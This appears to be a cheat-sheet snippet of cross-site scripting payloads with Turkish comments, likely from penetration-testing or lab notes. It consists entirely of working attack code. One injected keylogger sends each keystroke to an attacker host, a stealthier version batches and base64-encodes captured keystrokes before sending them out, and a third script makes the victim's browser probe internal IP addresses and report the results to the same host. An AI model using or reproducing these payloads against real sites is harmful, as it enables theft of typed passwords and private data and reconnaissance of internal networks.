# Keylogger payload:
<script>
document.onkeypress = function(e) {
  fetch('http://10.10.14.5:8888/?k=' + e.key);
};
</script>

# Daha gizli versiyon — batch gönderim:
<script>
var log = '';
document.onkeypress = function(e) { log += e.key; };
setInterval(function() {
  if(log) {
    fetch('http://10.10.14.5:8888/?k=' + btoa(log));
    log = '';
  }
}, 2000);
</script>

# XSS ile iç ağ tarama (tarayıcı pivot):
<script>
// Kurbanın tarayıcısından iç ağ IP'lerini tara
var ips = ['192.168.1.1','192.168.1.254','10.0.0.1'];
ips.forEach(function(ip) {
  var img = new Image();
  img.onload  = function() { fetch('http://10.10.14.5:8888/?up='  + ip); };
  img.onerror = function() { fetch('http://10.10.14.5:8888/?down=' + ip); };
  img.src = 'http://' + ip + '/favicon.ico';
});
</script>
